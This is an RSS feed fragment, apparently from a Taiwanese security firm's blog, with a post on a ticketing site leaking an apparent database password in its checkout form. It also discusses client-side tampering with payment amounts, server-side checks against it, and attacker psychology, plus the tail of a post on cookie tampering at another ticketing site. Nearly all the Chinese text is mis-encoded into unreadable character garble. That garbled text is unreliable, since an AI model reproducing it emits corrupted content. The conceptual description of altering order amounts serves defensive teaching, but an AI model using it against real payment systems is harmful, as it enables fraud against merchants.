&lt;p&gt;ç”±æ–¼ Cookie å­˜åœ¨ç€è¦½å™¨ç«¯ï¼Œæœ‰è¢«ç«„æ”¹çš„å¯èƒ½ï¼Œæ‰€ä»¥å¦‚æœç¶²ç«™ä½¿ç”¨ Cookie èªè­‰å°±æœƒæœ‰ä¸€äº›å®‰å…¨ä¸Šçš„é¢¨éšªã€‚æœ¬ç¯‡å°±ä»¥å®ç¢é›²ç«¯å”®ç¥¨ç‚ºä¾‹ï¼Œèªªæ˜é€™ç¨®å°ç–å¿½å¯èƒ½æœƒé€ æˆè¢«ç›œç”¨å¸³è™Ÿçš„é¢¨éšªã€‚é–‹ç™¼è€…åœ¨é¢å°ä½¿ç”¨è€…å¯ä»¥æ”¹è®Šçš„è®Šæ•¸ä¸€å®šè¦ç‰¹åˆ¥å°å¿ƒè™•ç†ï¼Œåšå¥½è©²æœ‰çš„é˜²è­·ï¼Œé‚„æ˜¯è€è©±ä¸€å¥ï¼šä½¿ç”¨è€…å‚³ä¾†çš„è³‡æ–™çš†ä¸å¯ä¿¡ï¼åªè¦æŒæ¡é€™å€‹åŸå‰‡ï¼Œé–‹ç™¼å‡ºä¾†çš„ç”¢å“å°±èƒ½å¤ å°‘å¾ˆå¤šå¾ˆå¤šé¢¨éšªï¼&lt;/p&gt;

&lt;p&gt;è¡Œæ–‡è‡³æ­¤ï¼Œé æœŸä¸­æ˜¯è¦å†æ¨å»£ä¸€ä¸‹æ¼æ´å›å ±å¹³å°ï¼Œé †ä¾¿ç¨±è®šå®ç¢éå¸¸é‡è¦–è³‡å®‰ï¼Œä¿®å¾©å¿«é€Ÿï¼Œæ˜¯è‰¯å¥½çš„æ­£å¾ªç’°ã€‚ä¸éå‰å…©å¤©çœ‹åˆ°ä¸€äº›é—œæ–¼å®ç¢é›²ç«¯å”®ç¥¨çš„æ–°èæ™‚ï¼Œä¸Šç·šç™¼ç¾æ­¤å¼±é»ä»æœªä¿®å¾©ï¼Œé€™å¥½åƒçœŸçš„æœ‰é»ä¸æ‡‰è©²ï¼Œç•¢ç«Ÿå®˜æ–¹ä¸Šé€±å·²ç¶“æ¥æ”¶åˆ°é€šå ±ï¼Œè¦ä¿®å¾©é€™å€‹å¼±é»ä¹Ÿåªéœ€ä¸€è¡Œåˆ¤æ–·å¼â€¦ã€‚èƒ½ç†è§£é€™æ¬¡çš„å¼±é»åœ¨çŸ­æ™‚é–“é–‹ç™¼éç¨‹ä¸­å¾ˆé›£è¢«æ³¨æ„åˆ°ï¼Œå°æ–¼é€™æ¨£ä¸€å€‹ä¸€é€±ä¸çœ ä¸ä¼‘å®Œæˆçš„å”®ç¥¨ç¶²ç«™ï¼Œæˆ‘å…¶å¯¦ä¹Ÿæ˜¯çµ¦äºˆæ»¿é«˜çš„è©•åƒ¹ï¼Œä½†å¦‚æœå®˜æ–¹èƒ½å†å¢å…©åˆ†å°è³‡å®‰äº‹ä»¶çš„é‡è¦–ï¼Œç›¸ä¿¡ä¸‹æ¬¡å®šèƒ½ä»¥æ»¿åˆ†ä¹‹å§¿å‘ˆç¾åœ¨ä½¿ç”¨è€…é¢å‰ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2015/01/30/cookie-security-insight-acer/</link>
                <guid>https://devco.re/blog/2015/01/30/cookie-security-insight-acer</guid>
                <pubDate>Fri, 30 Jan 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¾å¯¬å®å”®ç¥¨è«‡è³‡å®‰</title>
                <description>&lt;p&gt;æˆ´å¤«å¯‡çˆ¾éƒ¨è½æ ¼åœè¼‰äº†å¿«å…©å€‹æœˆï¼Œéå¸¸æŠ±æ­‰ï¼Œè®“å„ä½å¸¸å¸¸å‚¬ç¨¿çš„æœ‹å‹å€‘ä¹…ç­‰äº† &amp;lt;(_ _)&amp;gt;&lt;br /&gt;&lt;br /&gt;
ä»Šå¤©å°±ä¹˜è‘—å…¨è‡ºç˜‹è²·ç¥¨çš„æµªé ­ï¼Œä¾†è«‡è«‡ä¸€äº›å¸¸è¢«å¿½ç•¥çš„è³‡è¨Šå®‰å…¨å°æ¦‚å¿µå§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;æ±Ÿè•™å¼•é€€æ¼”å”±æœƒä¸€ç¥¨é›£æ±‚ï¼Œéš”å²¸è§€äº†å…©å¤©ç«ï¼Œ ä¹Ÿå¿ä¸ä½æƒ³è¦ç•¶å€‹éµç›¤å­å­ã€‚ç„¡å¥ˆé‹æ°£ä¸å¥½ä¸€ç›´é€£ä¸ä¸Šä¸»æ©Ÿï¼Œã€Service Unavailableã€ç•«é¢çœ‹è†©äº†ï¼Œåªå¥½çœ‹çœ‹æš«å­˜é é¢çš„ç¶²é åŸå§‹ç¢¼ï¼Œä¸çœ‹é‚„å¥½ï¼Œä¸€çœ‹æˆ‘é©šå‘†äº†ï¼&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_information_leakage.png&quot; alt=&quot;å¯¬å®å”®ç¥¨è³‡è¨Šæ´©æ¼&quot; title=&quot;å¯¬å®å”®ç¥¨è³‡è¨Šæ´©æ¼&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
ï¼ˆç‰¹åˆ¥è²æ˜ï¼šæ­¤æµç¨‹ä¸­ä¸¦ç„¡ä»»ä½•æ”»æ“Šè¡Œç‚ºï¼Œè©²é é¢æ˜¯æ­£å¸¸è³¼ç¥¨æµç¨‹ä¸­å‡ºç¾çš„ç¶²é ï¼‰&lt;/p&gt;

&lt;p&gt;åœ¨çµå¸³ç¶²é åŸå§‹ç¢¼ç•¶ä¸­ç«Ÿç„¶çœ‹åˆ°äº†ç–‘ä¼¼è³‡æ–™åº«å¯†ç¢¼ SqlPassWord åœ¨è¡¨å–®è£¡é¢ï¼é€™ä»¶äº‹å¾è³‡å®‰çš„è§’åº¦ä¾†çœ‹ï¼Œé™¤äº†è¡¨é¢ä¸Šæ´©æ¼äº†è³‡æ–™åº«å¯†ç¢¼ä¹‹å¤–ï¼Œé‚„æœ‰å…©å€‹æˆ‘æƒ³è¬›å¾ˆä¹…ä½†è‹¦ç„¡æ©Ÿæœƒè«‡çš„è³‡å®‰è­°é¡Œï¼Œåˆ†åˆ¥æ˜¯é‡‘æµä¸²æ¥å¸¸è¦‹çš„å¼±é»ä»¥åŠé§­å®¢çš„å¿ƒç†ã€‚è—‰è‘—å¯¬å®å”®ç¥¨ç¶²é æ´©æ¼å¯†ç¢¼é€™ä»¶äº‹æƒ…ï¼Œé †é“èˆ‡å¤§å®¶åˆ†äº«åˆ†äº«å§ï¼&lt;/p&gt;

&lt;h3 id=&quot;è«‡å°ç£ç¶²ç«™çš„é‡‘æµä¸²æ¥&quot;&gt;è«‡å°ç£ç¶²ç«™çš„é‡‘æµä¸²æ¥&lt;/h3&gt;

&lt;p&gt;åœ¨æœ¬ç¯‡çš„ä¾‹å­ä¸­ï¼Œå¯¬å®å”®ç¥¨ç¶²é è¡¨å–®å‡ºç¾äº†ç–‘ä¼¼è³‡æ–™åº«å¯†ç¢¼ï¼Œé€™ç‹€æ³å°±å¥½åƒå»éŠ€è¡Œç¹³æ¬¾ï¼Œæ«ƒæª¯çµ¦ä½ ä¸€æŠŠé‘°åŒ™è·Ÿä½ èªªï¼šã€é€™æ˜¯é‡‘åº«çš„é‘°åŒ™ï¼Œéº»ç…©ä½ åˆ°å°é¢é‚£å€‹æ«ƒæª¯æŠŠé‘°åŒ™çµ¦æœå‹™å“¡ï¼Œè«‹ä»–å¹«ä½ æŠŠéŒ¢æ”¾é€²é‡‘åº«è£¡é¢ã€ã€‚&lt;br /&gt;&lt;br /&gt;
æ˜¯ä¸æ˜¯æœ‰é»å¤šæ­¤ä¸€èˆ‰ï¼ŒéŠ€è¡Œæœ¬ä¾†å°±æœƒæœ‰ä¸€ä»½é‘°åŒ™ï¼Œå¹¹å˜›è¦è«‹ä½ ï¼ˆç€è¦½å™¨ï¼‰å¹«å¿™è½‰äº¤ï¼Ÿ&lt;br /&gt;&lt;br /&gt;
å¦‚æœä»Šå¤©å£äººæ‹¿åˆ°äº†é€™æŠŠé‘°åŒ™ï¼Œæ˜¯ä¸æ˜¯åªè¦ç¹éä¿å…¨çš„è¦–ç·šï¼Œå°±å¯ä»¥æ‰“é–‹é‡‘åº«ç‚ºæ‰€æ¬²ç‚ºï¼Ÿ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/3d_key_to_success.jpg&quot; alt=&quot;key_to_success&quot; title=&quot;key_to_success&quot; /&gt;&lt;/a&gt;&lt;br /&gt;
&lt;br /&gt;ï¼ˆPhoto by StockMonkeys.comï¼‰&lt;/p&gt;

&lt;p&gt;é¡ä¼¼çš„ç‹€æ³ä¹Ÿæ»¿å¸¸ç™¼ç”Ÿåœ¨é›»å­å•†å‹™èˆ‡ç¬¬ä¸‰æ–¹é‡‘æµæœå‹™çš„ä¸²æ¥ä¸Šã€‚&lt;br /&gt;&lt;br /&gt;
è¨±å¤šé›»å­å•†å‹™ç¶²ç«™å°ˆæ³¨æ–¼å•†å‹™ï¼Œé¸æ“‡å°‡ä»˜æ¬¾æ­¥é©Ÿå§”è¨—ç¬¬ä¸‰æ–¹é‡‘æµæœå‹™è™•ç†ï¼Œä¸€èˆ¬å¸¸è¦‹çš„æµç¨‹æ˜¯é€™æ¨£çš„ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é›»å­å•†å‹™è¨‚å–®æˆç«‹ï¼Œé›»å­å•†å‹™ç¶²ç«™çµ¦ä½ ä¸€å¼µå–®å­ï¼Œä¸Šé¢å¯«è‘—ï¼šã€è¨‚å–® 123 è™Ÿï¼Œ é‡‘é¡ 456 å…ƒã€ï¼Œè«‹ä½ å°‡å–®å­è½‰äº¤çµ¦ç¬¬ä¸‰æ–¹é‡‘æµæœå‹™ç¶²ç«™ä¸¦ç¹³æ¬¾ã€‚&lt;/li&gt;
  &lt;li&gt;é‡‘æµæœå‹™ç¶²ç«™ä¾æ“šä½ çµ¦å®ƒçš„å–®æ“šæ”¶å– 456 å…ƒï¼Œä¸¦ä¸”è·Ÿé›»å­å•†å‹™ç¶²ç«™èªªï¼šã€è¨‚å–® 123 å·²æˆåŠŸç¹³æ¬¾ï¼Œæ¬¾é … 456 å…ƒã€ã€‚&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œé›»å­å•†å‹™ç¶²ç«™å‘Šè¨´ä½ è¨‚å–® 123 è™Ÿè³¼è²·æˆåŠŸã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¦‚æœç¾åœ¨æœ‰ä¸€å€‹æƒ¡æ„ä½¿ç”¨è€…ï¼Œä»–åšäº†ä»¥ä¸‹æƒ¡æï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åœ¨æ­¥é©Ÿä¸€æŠŠé›»å­å•†å‹™ç¶²ç«™çµ¦çš„å–®å­ä¿®æ”¹æˆï¼šã€è¨‚å–® 123 è™Ÿï¼Œé‡‘é¡ 20 å…ƒã€ï¼ˆåŸåƒ¹æ˜¯ 456 å…ƒï¼‰&lt;/li&gt;
  &lt;li&gt;é‡‘æµæœå‹™å•†ä¾æ“šå–®æ“šè·Ÿæƒ¡æ„ä½¿ç”¨è€…æ”¶å– 20 å…ƒè²»ç”¨ï¼Œä¸¦ä¸”å‘Šè¨´é›»å­å•†å‹™ç¶²ç«™ï¼šã€è¨‚å–® 123 å·²æˆåŠŸç¹³æ¬¾ï¼Œæ¬¾é … 20 å…ƒã€&lt;/li&gt;
  &lt;li&gt;æœ€å¾Œé›»å­å•†å‹™ç¶²ç«™çœ‹åˆ°ã€è¨‚å–® 123 å·²æˆåŠŸç¹³æ¬¾ã€çš„è¨Šæ¯ï¼Œå°±å‘Šè¨´ä½¿ç”¨è€…èªªè¨‚å–® 123 è³¼è²·æˆåŠŸã€‚ä¹Ÿå°±æ˜¯æƒ¡æ„ä½¿ç”¨è€…åªèŠ±å– 20 å…ƒå°±è³¼è²·åˆ°åŸåƒ¹ 456 å…ƒçš„ç”¢å“ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(è²æ˜ï¼šç‚ºæ±‚ç²¾ç°¡ï¼Œé›»å­å•†å‹™èˆ‡é‡‘æµæœå‹™ä¸²æ¥æµç¨‹æœ‰ç¶“éç°¡åŒ–ï¼Œæœ‰æŠ“åˆ°ç²¾é«“å°±å¥½XD)&lt;/p&gt;

&lt;p&gt;ä¸ç®¡æ˜¯å¯¬å®å”®ç¥¨å‡ºç¾å¯†ç¢¼æ¬„ä½é‚„æ˜¯ä¸Šä¾‹é›»å­å•†å‹™ç¶²ç«™çš„é‡‘æµä¸²æ¥ï¼Œæœ€å¤§çš„å•é¡Œåœ¨æ–¼ä»–å€‘éƒ½ç›¸ä¿¡ä½¿ç”¨è€…æœƒæ­£å¸¸å¹«å¿™è½‰äº¤ï¼Œå³é å®¢æˆ¶ç«¯çš„ç€è¦½å™¨ä¾†è½‰å€å‚³å€¼ã€‚è¦çŸ¥é“ï¼Œåˆ©ç”¨ç€è¦½å™¨è½‰å€å‚³å€¼æ˜¯ä¸å¯é çš„ï¼Œä¸€ä¾†ï¼Œé‡è¦çš„è³‡è¨Šå°±æœƒè¢«å®¢æˆ¶çŸ¥é“ï¼Œä¾‹å¦‚å¯¬å®å”®ç¥¨ç–‘ä¼¼æ´©æ¼è³‡æ–™åº«å¯†ç¢¼ï¼›äºŒä¾†ä¸­é–“çš„å…§å®¹å¯ä»¥ä¿®æ”¹ï¼Œä¾‹å¦‚ä¿®æ”¹è¨‚å–®é‡‘é¡ã€‚å¦å¤–ï¼Œå¯èƒ½æœ‰äººæœƒç™¼ç¾åˆ°ï¼Œåœ¨æƒ¡æ„ä½¿ç”¨è€…çš„æ­¥é©Ÿä¸‰è£¡é¢ï¼Œé›»å­å•†å‹™ç¶²ç«™ç«Ÿç„¶æ²’æœ‰ç¢ºèªä»˜æ¬¾é‡‘é¡æ˜¯å¦æ­£ç¢ºï¼Œæ²’éŒ¯ï¼Œé€™æ˜¯æœƒç™¼ç”Ÿçš„äº‹æƒ…ï¼Œåœ¨éå»ç¶“é©—ä¸­ï¼Œåƒé€™æ¨£æ²’æœ‰æ¯”å°ä»˜æ¬¾é‡‘é¡çš„å°ç£ç³»çµ±æ¯”ä¾‹é‚„ä¸å°‘ï¼Œé€™äº›ç–å¿½éƒ½æœƒé€ æˆä¼æ¥­å¾ˆå¤šæˆæœ¬æå¤±ï¼Œä¸å¯ä¸æ³¨æ„ã€‚&lt;/p&gt;

&lt;p&gt;å°ç£ç›®å‰é‚„æ»¿å¸¸è¦‹åˆ°é€™ç¨®æ ¹æ“šä½¿ç”¨è€…å‚³ä¾†å–®æ“šä¾†æ”¶è²»çš„ç‹€æ³ï¼Œå°è‡´å–®æ“šå¯ç«„æ”¹é€ æˆä¼æ¥­æå¤±ï¼ŒæŸéƒ¨åˆ†åŸå› å¯ä»¥æ­¸å’åˆ°æ—©æœŸç¬¬ä¸‰æ–¹é‡‘æµçš„ç¯„ä¾‹éƒ½æ˜¯é€™æ¨£å¯«çš„ï¼Œå·¥ç¨‹å¸«ä¹Ÿå°±ç›´æ¥å»¶çºŒé€™æ¨£çš„å¯«æ³•ç›´åˆ°ç¾åœ¨ã€‚ä»¥é‡‘æµä¸²æ¥ç‚ºä¾‹ï¼Œæ¯”è¼ƒå¥½çš„è™•ç†æ–¹å¼æœ‰ä¸‹é¢å…©ç¨®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åœ¨å–®æ“šä¸ŠåŠ å…¥é˜²å½æ¨™è¨˜ï¼Œè®“æƒ¡æ„ä½¿ç”¨è€…ç„¡æ³•è¼•æ˜“ç«„æ”¹å–®æ“šã€‚åœ¨æŠ€è¡“ä¸Šä½œæ³•æœ‰é»é¡ä¼¼ OAuth åœ¨ Signing Request æ™‚çš„ä½œæ³•ï¼Œåœ¨è«‹æ±‚ä¸­å¤šé€ä¸€çµ„æª¢æŸ¥ç¢¼ï¼Œé€é one-way hash çš„æ–¹å¼æª¢æŸ¥ç¶²å€æ˜¯å¦æœ‰è¢«ä¿®æ”¹ï¼Œç›®å‰å¤§éƒ¨åˆ†é‡‘æµå•†éƒ½æœ‰æä¾›ç›¸ä¼¼è§£æ³•ã€‚&lt;/li&gt;
  &lt;li&gt;å–®æ“šä¸å†çµ¦ä½¿ç”¨è€…è½‰äº¤ï¼Œé›»å­å•†å‹™ç›´æ¥å‚³å–®å­ã€è¨‚å–® 123 è™Ÿï¼Œé‡‘é¡ 20 å…ƒã€çµ¦é‡‘æµæœå‹™ç¶²ç«™ï¼Œä¸¦è«‹ä½¿ç”¨è€…ç›´æ¥å»å°ˆå±¬çš„é‡‘æµå•†çª—å£ç¹³è²»å³å¯ã€‚åœ¨æŠ€è¡“ä¸Šå°±æ˜¯å°‡ç€è¦½å™¨è½‰å€å‚³å€¼çš„å‹•ä½œå…¨éƒ¨è®Šæˆä¼ºæœå™¨å°ä¼ºæœå™¨æºé€šè™•ç†æ‰ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä»¥ä¸Šå…©ç¨®ä½œæ³•ï¼Œå°‡å¯ä»¥æœ‰æ•ˆé˜²æ­¢æƒ¡æ„ä½¿ç”¨è€…ä¿®æ”¹è¨‚å–®é‡‘é¡ã€‚æ­¤å¤–ï¼Œå»ºè­°é›»å­å•†å‹™ç¶²ç«™åœ¨æ”¶åˆ°é‡‘æµå›å‚³çš„ä»˜æ¬¾è³‡è¨Šå¾Œï¼Œèƒ½å¤ æ¯”å°æ”¶å–æ¬¾é …èˆ‡è¨‚å–®æ¬¾é …æ˜¯å¦ç›¸ç¬¦ï¼Œå¦‚æ­¤é›™é‡æª¢æŸ¥ï¼Œèƒ½å¤§å¤§é¿å…æƒ¡æ„è¡Œç‚ºï¼Œæ¸›å°‘ä¼æ¥­è™•ç†æƒ¡æ„é‡‘æµå•é¡Œçš„æˆæœ¬ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è«‡é§­å®¢å¿ƒç†&quot;&gt;è«‡é§­å®¢å¿ƒç†&lt;/h3&gt;

&lt;p&gt;å¾ˆæ˜é¡¯çš„ï¼Œå¯¬å®å”®ç¥¨æ´©æ¼å¯†ç¢¼çš„ç‹€æ³æ˜¯å·¥ç¨‹å¸«çš„å°ç–æ¼ã€‚åœ¨ä¸çŸ¥é“è³‡æ–™åº«ç¢ºåˆ‡ä½ç½®çš„å‰æä¸‹ï¼ŒçŸ¥é“ç–‘ä¼¼è³‡æ–™åº«å¯†ç¢¼çš„æ±è¥¿ç¢ºå¯¦ä¹Ÿç„¡æ³•åšä»€éº¼ï¼Œé ‚å¤šå°±æ˜¯äº†è§£äº†ä¸€å®¶å…¬å¸åˆ¶å®šå¯†ç¢¼çš„ç­–ç•¥ã€‚ç„¶è€Œï¼Œçœ‹åœ¨é§­å®¢çœ¼è£¡ï¼Œé€™é»ç–å¤±æœƒä»£è¡¨è‘—ä¸€å€‹ç¶²ç«™é¢å°è³‡å®‰çš„æ…‹åº¦ã€‚é€£é¡¯è€Œæ˜“è¦‹çš„å•é¡Œéƒ½æ²’æœ‰æ³¨æ„ï¼Œé‚£å¾Œç«¯ç¨‹å¼æ‡‰è©²ä¹Ÿæœ‰å¯èƒ½å‡ºç¾æ¼æ´ã€‚ä¸€æ—¦é§­å®¢æ±ºå®šè¦æ”»æ“Šé€™å€‹ç¶²ç«™ï¼Œå‹¢å¿…æœƒæ¬å‡ºæ¯”å¹³å¸¸é‚„è¦å¤šçš„è³‡æºå»å˜—è©¦ï¼Œå› ç‚ºä»–å€‘èªç‚ºé€™å€‹æŠ•è³‡å ±é…¬ç‡å¾ˆé«˜ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€èˆ¬é§­å®¢åŸºæœ¬ä¸Šæœƒä¸æ–·çš„å¾æ‰€çœ‹åˆ°çš„ç¶²é è³‡è¨Šä¾†èª¿æ•´è‡ªå·±æ”»æ“Šçš„å¼·åº¦ï¼Œå¦‚æœä»–å€‘ä¸æ–·çœ‹åˆ°äº†å¥‡æ€ªçš„ç™»å…¥ç•«é¢ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_1.png&quot; alt=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢1&quot; title=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æˆ–æ˜¯é˜²ç«ç‰†çš„ç™»å…¥ç•«é¢&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150109/kham_login_2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150109/kham_login_2.png&quot; alt=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢2&quot; title=&quot;å¯¬å®å”®ç¥¨ç™»å…¥é é¢2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å°±å¾ˆæœ‰å¯èƒ½æœƒå¢åŠ æ”»æ“Šçš„åŠ›é“ã€‚ä¸Šé¢é€™ç¨®ç™»å…¥é é¢å°±æ˜¯å°±æ˜¯ä¸€ç¨®å¸¸è¦‹çš„è³‡è¨Šæ´©æ¼ï¼Œåœ¨ä»Šå¹´å°ç£é§­å®¢å¹´æœƒçš„è­°ç¨‹ï¼ã€Œ&lt;a href=&quot;https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/&quot;&gt;è¢«éºå¿˜çš„è³‡è¨Šæ´©æ¼&lt;/a&gt;ã€å°±æåŠäº†é€™é¡è³‡è¨Šæ´©æ¼åœ¨å°ç£æ˜¯å¾ˆæ™®åŠçš„ã€‚æ³¨æ„ï¼Œå‡ºç¾é€™æ¨£çš„é é¢ä¸¦ä¸æ„å‘³è‘—ç¶²ç«™æœƒæœ‰æ¼æ´ï¼Œåªæ˜¯ç¶²ç«™å®¹æ˜“å› æ­¤å¤šå—åˆ°ä¸€äº›æ”»æ“Šã€‚åä¹‹ï¼Œå¦‚æœä¸€å€‹ç¶²ç«™å‰ç«¯é é¢å¯«çš„ä¹¾æ·¨æ¼‚äº®ï¼Œç”šè‡³é€£ &lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP å®‰å…¨ header&lt;/a&gt; é€™ç¨®å°ç´°ç¯€éƒ½æœƒæ³¨æ„åˆ°ï¼Œé§­å®¢å¯èƒ½å°±æœƒèªç‚ºé€™å€‹ç¶²ç«™å¯«çš„å¾ˆåš´è¬¹ï¼Œç”šè‡³é€£å˜—è©¦çš„æ…¾æœ›éƒ½æ²’æœ‰äº†ã€‚&lt;/p&gt;

&lt;p&gt;ä¸€å€‹ç¶“é©—è±å¯Œçš„é§­å®¢ï¼Œé€šå¸¸å…‰çœ‹é¦–é å°±èƒ½å¤ åˆ¤æ–·è©²ç¶²ç«™æ˜¯å¦å¯èƒ½å­˜æœ‰æ¼æ´ï¼Œæ†‘è—‰çš„å°±æ˜¯é€™äº›è››çµ²é¦¬è·¡ã€‚ç‚ºäº†ä¸è®“è‡ªå®¶ç¶²ç«™å¸¸è¢«è·¯éçš„æƒ¡æ„ä½¿ç”¨è€…æ”»æ“Šï¼ŒåŠ å¼·ç¶²é å‰ç«¯çš„å‘ˆç¾ã€ç¶²é åŸå§‹ç¢¼ä¹¾æ·¨æœ‰æ¶æ§‹ã€æ²’æœ‰å¤ªå¤šè³‡è¨Šæ´©æ¼ï¼Œé€™äº›éƒ½æ˜¯å¾ˆå¥½çš„é˜²ç¦¦æ–¹æ³•ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;åœ¨ä½¿ç”¨æœ€è¿‘ç†±é–€çš„å¯¬å®å”®ç¥¨ç¶²ç«™æ™‚ï¼Œæˆ‘å€‘ç™¼ç¾ç¶²é åŸå§‹ç¢¼å­˜åœ¨ä¸€äº›ç–‘ä¼¼å¯†ç¢¼çš„è³‡è¨Šã€‚å¾é€™ä»¶äº‹æƒ…å‡ºç™¼ï¼Œæˆ‘å€‘åˆ†åˆ¥å»¶ä¼¸æ¢è¨äº†å…©å€‹å·¥ç¨‹å¸«æ‡‰è©²æ³¨æ„çš„è­°é¡Œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç¬¬ä¸€å€‹è­°é¡Œæé†’å¤§å®¶åœ¨é–‹ç™¼çš„æ™‚å€™ï¼Œé‡è¦çš„è³‡è¨Šåƒè¬ä¸è¦é€éå®¢æˆ¶ç«¯ç€è¦½å™¨å¹«å¿™è½‰é€ï¼Œè¨˜ä½å®¢æˆ¶ç«¯éƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¤šç¶“ä¸€æ‰‹å°±å¤šä¸€åˆ†é¢¨éšªã€‚æ–‡ä¸­èˆ‰å‡ºäº†å°ç£é›»å•†ç¶²ç«™åœ¨é‡‘æµä¸²æ¥æ™‚ä¹Ÿå¸¸å‡ºç¾é€™æ¨£çš„å•é¡Œï¼Œå¯èƒ½æœƒé€ æˆè¨‚å–®é‡‘é¡è¢«ç«„æ”¹ç­‰ä¼æ¥­æœƒæœ‰æ‰€æå¤±çš„å•é¡Œã€‚&lt;/li&gt;
  &lt;li&gt;ç¬¬äºŒå€‹è­°é¡Œå¾é§­å®¢çš„å¿ƒç†ä¾†è«‡è³‡å®‰ï¼Œä¸€å€‹ç¶²ç«™å¦‚æœæ²’æœ‰ä»€éº¼ä¿è­·æ©Ÿåˆ¶ã€è¼•æ˜“çš„æ´©æ¼ç¶²ç«™è³‡è¨Šï¼Œéå¸¸å®¹æ˜“æŒ‘èµ·é§­å®¢æƒ³è¦å˜—è©¦å…¥ä¾µçš„æ…¾æœ›ï¼›åä¹‹ï¼Œè‹¥ä¸€å€‹ç¶²ç«™å¾å‰ç«¯åˆ°ä½¿ç”¨æµç¨‹éƒ½éå¸¸æ³¨æ„ç´°ç¯€ï¼Œä¸€èˆ¬é§­å®¢è¼ƒæœƒèˆˆè‡´ç¼ºç¼ºã€‚åš´è¬¹çš„å‰ç«¯å‘ˆç¾ï¼Œå°±æŸç¨®ç¨‹åº¦ä¾†èªªï¼Œä¹Ÿæ˜¯ä¸€ç¨®å°è‡ªèº«ç¶²ç«™çš„ä¿è­·ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¸Œæœ›é–‹ç™¼è€…çœ‹åˆ°ä¸Šé¢é€™å…©å€‹è­°é¡Œæœ‰æŒæ¡åˆ°ã€åˆ¥ç›¸ä¿¡å®¢æˆ¶ç«¯ã€ã€ã€é§­å®¢æœƒå› ç¶²ç«™å‰ç«¯å¯«æ³•ä¸åš´è¬¹è€Œå˜—è©¦å»æ”»æ“Šã€çš„é‡é»ï¼Œææ˜‡è‡ªå®¶ç¶²ç«™çš„å®‰å…¨åº¦å§ï¼&lt;/p&gt;

&lt;p&gt;æœ€å¾Œèªªå€‹é¡Œå¤–è©±ï¼Œèº«ç‚ºä¸€å€‹å·¥ç¨‹å¸«ï¼Œæˆ‘èªç‚ºè³‡è¨Šç³»çµ±è©²å¸¶çµ¦ä¸–ç•Œçš„å¥½è™•æ˜¯ç¯€çœå¤§å®¶çš„æ™‚é–“ï¼Œè€Œé€™æ¬¡æ¶ç¥¨å»è®“ç„¡æ•¸äººå¾¹å¤œæ’éšŠæˆ–å®ˆåœ¨é›»è…¦å‰ä¸æ–·çš„ã€é€£ä¸ä¸Šã€è²·ç¥¨ã€å¤±æ•—ã€å¾ªç’°ã€‚é€™ä¹Ÿè¨±èƒ½å¤ è³ºåˆ°å¤§é‡çš„æ–°èç‰ˆé¢ï¼Œæœ€çµ‚ç¥¨ä¹Ÿèƒ½å…¨éƒ¨è³£å…‰ï¼Œä½†æƒ³åˆ°å°ç£æœ‰æ•¸åè¬å°æ™‚çš„ç”Ÿç”¢åŠ›æµªè²»åœ¨ç„¡æ„ç¾©çš„ç­‰å¾…ä¸Šï¼Œå°±è¦ºå¾—é€™å€‹ç³»çµ±å¥½å¤±æ•—ã€‚ç¾åœ¨çš„æŠ€è¡“å·²ç¶“å¯ä»¥è² è·é€™æ¨£å¤§è¦æ¨¡çš„å”®ç¥¨ï¼Œ&lt;a href=&quot;https://kktix.com/&quot;&gt;KKTIX&lt;/a&gt; ç”šè‡³å¯ä»¥&lt;a href=&quot;https://medium.com/@hlb/kktix-2015-01-7bf84c47dfdf&quot;&gt;ä¸€åˆ†é˜è™•ç† 10 è¬å¼µåŠƒä½ç¥¨åˆ¸&lt;/a&gt;ï¼ä¸–ç•Œåœ¨é€²æ­¥ï¼Œéå»çš„æŠ€è¡“ä¹Ÿè¨±å°±è©²è®“å®ƒç•™åœ¨éå»ã€‚æœ‰äººèªªï¼šã€çœŸæ­£å¹¸ç¦çš„äººï¼šä¸æ˜¯æ¶åˆ°ç¥¨ï¼Œæ˜¯å¯ä»¥åƒæ±Ÿè•™ä¸€æ¨£é¸æ“‡äººç”Ÿã€ï¼Œå¸Œæœ›æˆ‘ä¹Ÿå¯ä»¥è®Šæˆä¸€å€‹å¹¸ç¦çš„äººï¼Œå¯ä»¥é¸æ“‡ä¸€å€‹ä¸å¡è»Šçš„å”®ç¥¨ç³»çµ±ã€‚&lt;/p&gt;
</description>
